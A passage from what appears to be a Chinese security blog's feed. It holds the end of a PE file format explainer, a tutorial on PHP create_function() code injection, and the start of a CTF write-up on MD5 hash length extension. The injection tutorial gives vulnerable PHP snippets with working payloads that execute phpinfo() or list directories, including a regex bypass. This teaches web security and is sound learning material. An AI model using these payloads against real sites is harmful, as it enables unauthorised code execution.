+001ch   -   所有含代码的节的总大小</span><br><span class="line">    DWORD   SizeOfInitializedData;                 // +0020h   -   所有含已初始化数据的节的总大小</span><br><span class="line">    DWORD   SizeOfUninitializedData;               // +0024h   -   所有含未初始化数据的节的大小</span><br><span class="line">    DWORD   AddressOfEntryPoint;                   // +0028h   -   程序执行入口RVA</span><br><span class="line">    DWORD   BaseOfCode;                            // +002ch   -   代码的节的起始RVA</span><br><span class="line">    DWORD   BaseOfData;                            // +0030h   -   数据的节的起始RVA</span><br><span class="line">    DWORD   ImageBase;                             // +0034h   -   程序的建议装载地址</span><br><span class="line">    DWORD   SectionAlignment;                      // +0038h   -   内存中的节的对齐粒度</span><br><span class="line">    DWORD   FileAlignment;                         // +003ch   -   文件中的节的对齐粒度</span><br><span class="line">    WORD    MajorOperatingSystemVersion;           // +0040h   -   操作系统版本号</span><br><span class="line">    WORD    MinorOperatingSystemVersion;           // +0042h   -   </span><br><span class="line">    WORD    MajorImageVersion;                     // +0044h   -   该PE的版本号</span><br><span class="line">    WORD    MinorImageVersion;                     // +0046h   -   </span><br><span class="line">    WORD    MajorSubsystemVersion;                 // +0048h   -   所需子系统的版本号</span><br><span class="line">    WORD    MinorSubsystemVersion;                 // +004ah   -   </span><br><span class="line">    DWORD   Win32VersionValue;                     // +004ch   -   未用</span><br><span class="line">    DWORD   SizeOfImage;                           // +0050h   -   内存中的整个PE映象尺寸</span><br><span class="line">    DWORD   SizeOfHeaders;                         // +0054h   -   所有头+节表的大小</span><br><span class="line">    DWORD   CheckSum;                              // +0058h   -   校验和</span><br><span class="line">    WORD    Subsystem;                             // +005ch   -   文件的子系统</span><br><span class="line">    WORD    DllCharacteristics;                    // +005eh   -   DLL文件特性</span><br><span class="line">    DWORD   SizeOfStackReserve;                    // +0060h   -   初始化时的栈大小</span><br><span class="line">    DWORD   SizeOfStackCommit;                     // +0064h   -   初始化时实际提交的栈大小</span><br><span class="line">    DWORD   SizeOfHeapReserve;                     // +0068h   -   初始化时保留的堆大小</span><br><span class="line">    DWORD   SizeOfHeapCommit;                      // +006ch   -   初始化时实际提交的堆大小</span><br><span class="line">    DWORD   LoaderFlags;                           // +0070h   -   与调试有关</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;                   // +0074h   -   下面的数据目录结构的项目数量</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];     // 0078h   -   数据目录</span><br><span class="line">&#125;IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><h2 id="0x04-目录表IMAGE-DATA-DIRECTORY"><a href="#0x04-目录表IMAGE-DATA-DIRECTORY" class="headerlink" title="0x04 目录表IMAGE_DATA_DIRECTORY"></a>0x04 目录表IMAGE_DATA_DIRECTORY</h2><p>定义了PE文件中出现的所有不同类型的数据的目录信息，从Windows NT 3.1操作系统开始到现在，该数据目录中定义的数据类型一直是16种。它是一个数组，有16个成员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">    DWORD   VirtualAddress;                 // +0000h   -   数据的起始RVA</span><br><span class="line">    DWORD   Size;                           // +0004h   -   数据块的长度，最后一个是000000表示结束</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>数组编号描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0导出表地址和大小</span><br><span class="line">1导入表地址和大小</span><br><span class="line">2资源表地址和大小</span><br><span class="line">3异常表地址和大小</span><br><span class="line">4属性证书数据地址和大小</span><br><span class="line">5基地址重定位表地址和大小</span><br><span class="line">6调试信息地址和大小</span><br><span class="line">7预留为0</span><br><span class="line">8指向全局指针寄存器的值</span><br><span class="line">9线程局部存储地址和大小</span><br><span class="line">10加载配置表地址和大小</span><br><span class="line">11绑定导入表地址和大小</span><br><span class="line">12导入函数地址表地址和大小</span><br><span class="line">13延迟导入表地址和大小</span><br><span class="line">14CLR运行时头部数据地址和大小</span><br><span class="line">15系统保留</span><br></pre></td></tr></table></figure><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><p>导入表是一个 IMAGE_IMPORT_DESCRIPTOR 结构数组。导入表数据的起始部分是多组导入表描述符结构。每个结构包含PE文件引入函数的一个相关DLL的信息。比如，如果该PE文件从10个不同的DLL中引入函数，那么这个数组就有10个成员。该数组以一个全0的成员结尾。<br>导入表描述符IMAGE_IMPORT_DESCRIPTOR:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_IMPORT_DESCRIPTOR &#123;  </span><br><span class="line">    union &#123;  </span><br><span class="line">        DWORD Characteristics;  </span><br><span class="line">        DWORD OriginalFirstThunk;     //INT(导入名字表)的地址(RVA)桥1  </span><br><span class="line">    &#125;;  </span><br><span class="line">    DWORD TimeDateStamp;     //时间戳</span><br><span class="line">    DWORD ForwarderChain;    //链表的前一个结构</span><br><span class="line">    DWORD Name;              //指向链接库的指针  </span><br><span class="line">    DWORD FirstThunk;        //(IAT)导入地址表的地址 (RVA)桥2  </span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_THUNK_DATA32 &#123;</span><br><span class="line">union &#123;</span><br><span class="line">DWORD ForwarderString;      // PBYTE </span><br><span class="line">DWORD Function;             // 导入表导入函数的实际内存地址</span><br><span class="line">DWORD Ordinal; // 导入表导入函数的导出序号</span><br><span class="line">DWORD AddressOfData;        // 指向IMAGE_IMPORT_BY_NAME结构</span><br><span class="line">&#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line">typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><p>导入表的双桥结构(  每一个结构IMAGE_IMPORT_DESCRIPTOR都对应的是一个唯一的dll文件。以及dll中的每个函数都可以通过”编号-名称”的方式找到，这就是导入表的双桥结构。):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_BY_NAME &#123;</span><br><span class="line">    WORD    Hint;//函数序号</span><br><span class="line">    CHAR   Name[1];//函数名字符串</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><p>_IMAGE_DATA_DIRECTORY结构体数组的第1个元素索引处导出表。一般情况下，dll的函数导出供其他人使用，exe将别人的dll的函数导入运行。 所以，一般.exe没有导出表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;    //未使用，恒为0x00000000</span><br><span class="line">    DWORD   TimeDateStamp;      //时间戳</span><br><span class="line">    WORD    MajorVersion;       //未使用</span><br><span class="line">    WORD    MinorVersion;       //未使用</span><br><span class="line">    DWORD   Name;               //指向改导出表文件名字符串,即库名称</span><br><span class="line">    DWORD   Base;               //导出表的起始序号</span><br><span class="line">    DWORD   NumberOfFunctions;  //导出函数的个数(更准确来说是AddressOfFunctions的元素数，而不是函数个数)</span><br><span class="line">    DWORD   NumberOfNames;      //以函数名字导出的函数个数</span><br><span class="line">    DWORD   AddressOfFunctions;     //导出函数地址表RVA:存储所有导出函数地址(表元素宽度为4，总大小NumberOfFunctions * 4)</span><br><span class="line">    DWORD   AddressOfNames;         //导出函数名称表RVA:存储函数名字符串所在的地址(表元素宽度为4，总大小为NumberOfNames * 4)</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  //导出函数序号表RVA:存储函数序号(表元素宽度为2，总大小为NumberOfNames * 2)</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><h2 id="0x05-节表项IMAGE-SECTION-HEADER"><a href="#0x05-节表项IMAGE-SECTION-HEADER" class="headerlink" title="0x05 节表项IMAGE_SECTION_HEADER"></a>0x05 节表项IMAGE_SECTION_HEADER</h2><p>节表：PE代码和数据的结构数据，指示装载系统代码段在哪里，数据段在哪里等。节表是一个由IMAGE_SECTION_HEADER结构组成的数组，每个结构用来描述一个节</p><p>节表类似于目录表，是一种结构体的数组，结构体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];           // +0000h   -   8个字节节名，如.bss</span><br><span class="line">    union &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;                                  // +0008h   -   节区的尺寸</span><br><span class="line">    DWORD   VirtualAddress;                  // +000ch   -   节区的RVA地址</span><br><span class="line">    DWORD   SizeOfRawData;                   // +0010h   -   在文件中对齐后的尺寸</span><br><span class="line">    DWORD   PointerToRawData;                // +0014h   -   在文件中的偏移</span><br><span class="line">    DWORD   PointerToRelocations;            // +0018h   -   在OBJ文件中使用</span><br><span class="line">    DWORD   PointerToLinenumbers;            // +001ch   -   行号表的位置（供调试用）</span><br><span class="line">    WORD    NumberOfRelocations;             // +0020h   -   在OBJ文件中使用</span><br><span class="line">    WORD    NumberOfLinenumbers;             // +0022h   -   行号表中行号的数量</span><br><span class="line">    DWORD   Characteristics;                 // +0024h   -   节的属性</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>节表后面就是节的内容。</p><h2 id="0x06-节数据"><a href="#0x06-节数据" class="headerlink" title="0x06 节数据"></a>0x06 节数据</h2><ul><li>text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code</li><li>.data：初始化的数据块，是初始化的数据块，包含那些编译时被初始化的变量、字符串</li><li>.idata：输入表，包含其他外来dll的函数和数据信息，也就是输入表，也有人称之为导入表。</li><li>.rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。</li><li>.reloc：重定位表，用于保存基址的重定位表。即当装在程序不能按照连接器所指定的地址装载文件是，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装在则忽略此段中的数据。</li><li>.edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态连接库文件中。</li><li>.radata：存放调试目录、说明字符串，该数据块并不常见主要是用于存放一些调试信息</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;Portable Executable（可移植的执行体）是目前Windows平台上主流的可执行文件格
      
    
    </summary>
    
    
      <category term="操作系统" scheme="https://kevens10.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="CTF 逆向" scheme="https://kevens10.github.io/tags/CTF-%E9%80%86%E5%90%91/"/>
    
      <category term="CTF PWN" scheme="https://kevens10.github.io/tags/CTF-PWN/"/>
    
      <category term="操作系统" scheme="https://kevens10.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>create_function()注入命令执行漏洞</title>
    <link href="https://kevens10.github.io/articles/create_function()%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://kevens10.github.io/articles/create_function()%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</id>
    <published>2019-11-24T14:39:05.000Z</published>
    <updated>2019-11-24T15:13:56.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-create-function-介绍"><a href="#0x00-create-function-介绍" class="headerlink" title="0x00 create_function()介绍"></a>0x00 create_function()介绍</h2><p>create_function()创建匿名函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function    ( string $args   , string $code   )</span><br></pre></td></tr></table></figure><p>string $args 变量部分<br>string $code 方法代码部分</p><p>举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(&apos;$name&apos;,&apos;echo $name.&quot;A&quot;&apos;)</span><br></pre></td></tr></table></figure><p>类似于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function name($name) &#123;</span><br><span class="line">  echo $name.&quot;A&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//02-8.php?id=2;&#125;phpinfo();/*</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$str2=&apos;echo  &apos;.$a.&apos;test&apos;.$id.&quot;;&quot;;</span><br><span class="line">echo $str2;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;==============================&quot;;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$f1 = create_function(&apos;$a&apos;,$str2);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;==============================&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/libtest/02-8.php?id=2;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure><p>原理：<br>id=2;}phpinfo();/*</p><p>执行函数为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">function fT($a) &#123;</span><br><span class="line">  echo &quot;test&quot;.$a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入后代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function fT($a) &#123;</span><br><span class="line">  echo &quot;test&quot;;&#125;</span><br><span class="line">  phpinfo();/*;//此处为注入代码。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//how to exp this code</span><br><span class="line">$sort_by=$_GET[&apos;sort_by&apos;];</span><br><span class="line">$sorter=&apos;strnatcasecmp&apos;;</span><br><span class="line">$databases=array(&apos;test&apos;,&apos;test&apos;);</span><br><span class="line">$sort_function = &apos;  return 1 * &apos; . $sorter . &apos;($a[&quot;&apos; . $sort_by . &apos;&quot;], $b[&quot;&apos; . $sort_by . &apos;&quot;]);&apos;;</span><br><span class="line">usort($databases, create_function(&apos;$a, $b&apos;, $sort_function));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func.php?sort_by=&quot;]);&#125;phpinfo();/*</span><br></pre></td></tr></table></figure><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&apos;action&apos;]))&#123;</span><br><span class="line">$action=$_GET[&apos;action&apos;];</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;action&apos;]))&#123;</span><br><span class="line">$arg=$_GET[&apos;arg&apos;];</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;,$action))&#123;</span><br><span class="line">show_sourse(_FILE_);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$action($arg,&apos;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>正则绕过，数字字母下划线都被禁止.<br>思路就是在开头或结尾插入字符绕过检测，涉及到php全局命名空间：在函数的头部加上 \就是调用全局的此函数，即\create_function()就是调用全局的create_function()函数，同时函数头部加上\可绕过正则过滤，\即%5c.</p><p>漏洞利用处$action($arg,’’);，也就是说如果利用create_function()函数漏洞，这里是参数为GET值，执行代码为空</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip/?action=%5ccreate_function&amp;arg=)&#123;&#125;var_dump(scandir(&quot;./&quot;));/*</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-create-function-介绍&quot;&gt;&lt;a href=&quot;#0x00-create-function-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 create_function()介绍&quot;&gt;&lt;/a&gt;0x00 create_func
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="PHP" scheme="https://kevens10.github.io/tags/PHP/"/>
    
      <category term="后端" scheme="https://kevens10.github.io/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>哈希扩展长度攻击</title>
    <link href="https://kevens10.github.io/articles/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB.html"/>
    <id>https://kevens10.github.io/articles/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB.html</id>
    <published>2019-11-23T10:59:18.000Z</published>
    <updated>2019-11-24T08:49:22.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MD5算法流程"><a href="#MD5算法流程" class="headerlink" title="MD5算法流程"></a>MD5算法流程</h2><p><img src="/images/haxikuozhanchangdugongji1.png" alt><br>MD5算法主要分这几步：<br>1.把消息分为n个消息块。（补位）<br>2.对最后一个消息块进行消息填充。（补长度）<br>3.每个消息块和一个输入量做运算，把运算结果作为下一个输入量（计算消息摘要）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hash函数拿到需要处理的字符串后，需要先补位。</span><br><span class="line">即使得其长度在对 512 取模后的值为 448。也就是说，len(message) % 512 == 448。</span><br><span class="line">用字节长度整除64，取得余数。</span><br><span class="line">如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。</span><br><span class="line">如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。</span><br><span class="line">补位的方式的二进制表示是在消息的后面加上一个1，后面跟着无限个0，直到 len(message) % 512 == 448。在 16 进制下，我们需要在消息后补80，就是 2 进制的10000000。我们把消息abc进行补位到 448 bit，也就是 56 byte。</span><br><span class="line">eg：被操作字符串为“test”,长度即为0x20（长度按照bit算）</span><br><span class="line"></span><br><span class="line">补位之后补长度</span><br><span class="line">补位过后，倒数第8 个字节储存的是补位之前的消息长度。比如，abc是 3 个字母，也就是 3 个字节，24 bit。换算成 16 进制为 0x18。其后跟着 7 个字节的 0x00，把消息补满 64 字节</span><br><span class="line"></span><br><span class="line">计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</span><br><span class="line">A=0x67452301 B=0xefcdab89 C=0x98badcfe D=0x10325476 </span><br><span class="line">经过一次消息摘要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。</span><br></pre></td></tr></table></figure><h2 id="长度扩展攻击"><a href="#长度扩展攻击" class="headerlink" title="长度扩展攻击"></a>长度扩展攻击</h2><p>哈希长度拓展攻击(Hash Length Extension Attacks)的实现就是基于初始链变量的值被新的覆盖。<br>哈希长度扩展攻击适用于加密情况为：<code>hash($SECRET, $message)</code>的情况，其中 hash 最常见的就是 md5、sha1。我们可以在不知道<code>$SECRET</code>的情况下推算出另外一个匹配的值。<br>我们在不知道具体<code>$SECRET</code>的情况下，得知了其 hash 值，以及我们有一个可控的消息。 而我们得到的 hash 值正是<code>最后一轮摘要后的经过高地位互换的链变量</code>。 我们可以想像一下，在常规的摘要之后把我们的控制的信息进行下一轮摘要，只需要知道上一轮消息产生的链变量<br>一个题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</span><br><span class="line"></span><br><span class="line">$username = $_POST[&quot;username&quot;];</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;# ===俩边不管值还是类型都要一致</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);#exit()/die() 函数输出一条消息，并退出当前脚本</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if ($_COOKIE[&quot;source&quot;] != 0) &#123;</span><br><span class="line">        echo &quot;&quot;; // This source code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;h1&gt;Admins Only!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you have the correct credentials, log in below. If not, please LEAVE.&lt;/p&gt;</span><br><span class="line">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="line">    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;</span><br><span class="line">    &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password)))</span><br></pre></td></tr></table></figure><p>flag获取的要求是：传进一个cookie使getmein等于md5($secret . urldecode($username . $password))且后面部分不能为adminadmin,<br>也就是说需要构造getmein的cookie和他那串字符相同就可以。<br>sample-hash即通过setcookie得来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br></pre></td></tr></table></figure><p>假设<code>secret</code>为 <code>&quot;123456789abcdef&quot;</code><br>即此hash值是通过<code>MD5(&quot;123456789abcdefadminadmin&quot;)</code>得来<br>而题目要求我们设置getmein的值为<code>MD5(&quot;123456789abcdefadmin+???&quot;)</code><br>后面那块是自己控制的，我们可以构造为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 